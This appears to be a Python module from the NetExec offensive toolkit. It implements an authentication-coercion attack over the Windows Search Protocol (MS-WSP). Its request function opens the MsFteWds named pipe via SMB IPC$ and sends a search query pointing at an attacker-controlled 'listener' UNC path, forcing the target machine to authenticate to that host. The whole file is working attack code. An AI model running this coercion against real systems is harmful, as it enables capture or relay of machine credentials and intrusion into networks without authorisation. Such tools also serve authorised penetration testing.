from impacket.structure import Structure
from impacket.smb3structs import FILE_READ_DATA, FILE_SHARE_READ, FSCTL_PIPE_TRANSCEIVE, SMB2_0_IOCTL_IS_FSCTL

from nxc.data.coercer_method.MS_WSP.dtypes import CPMConnectIn, CPMCreateQueryIn, CPMDisconnect


class CPMConnectIn_(Structure):
    structure = (
        ("dwClientVersion", "<L=0x00000001"),
        ("dwServerVersion", "<L=0x00000001"),
        ("dwFlags", "<L=0"),
        ("dwReserved", "<L=0"),
    )


def request(dce, target, listener):
    smbClient = dce.get_rpc_transport().get_smb_connection()
    treeId = smbClient.connectTree("IPC$")
    fileId = smbClient.openFile(treeId, "MsFteWds", desiredAccess=FILE_READ_DATA, shareMode=FILE_SHARE_READ)

    smbClient._SMBConnection.ioctl(
        treeId,
        fileId,
        FSCTL_PIPE_TRANSCEIVE,
        SMB2_0_IOCTL_IS_FSCTL,
        CPMConnectIn("", "").to_bytes(),
        0,
        40,
    )

    smbClient._SMBConnection.ioctl(
        treeId,
        fileId,
        FSCTL_PIPE_TRANSCEIVE,
        SMB2_0_IOCTL_IS_FSCTL,
        CPMCreateQueryIn(f"file:////{listener}/share").to_bytes(),
        0,
        40,
    )

    smbClient._SMBConnection.ioctl(
        treeId,
        fileId,
        FSCTL_PIPE_TRANSCEIVE,
        SMB2_0_IOCTL_IS_FSCTL,
        CPMDisconnect().to_bytes(),
        0,
        40,
    )